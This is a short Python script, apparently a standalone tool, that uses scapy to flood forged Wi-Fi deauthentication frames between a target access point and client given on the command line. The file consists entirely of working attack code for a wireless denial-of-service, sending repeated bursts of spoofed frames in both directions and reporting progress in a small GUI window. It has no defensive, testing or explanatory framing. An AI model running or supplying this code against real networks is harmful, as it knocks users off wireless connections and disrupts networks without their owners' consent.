from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
import os
import sys
import PySimpleGUI as sg


sniffer_interface = sys.argv[1]
ap_mac = sys.argv[2]
client_mac = sys.argv[3]

print("attaching client mac:", client_mac)
strDeath = 'Sent 20 packets\nSending death packets\n'

for y in range(1, 4):
    # packet from client to AP
    pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    # packet from AP to client
    pkt2 = RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
    for _ in range(50):
        printt = sg.Print
        printt(strDeath)
        printt('..................')
        sendp(pkt1, iface=sniffer_interface, count=20)
        sendp(pkt2, iface=sniffer_interface, count=20)
        if y % 30 == 0:
            press = input("press p to stop, otherwise any\n")
            if press == 'p':
                print("#  Goodbye  #")
                break
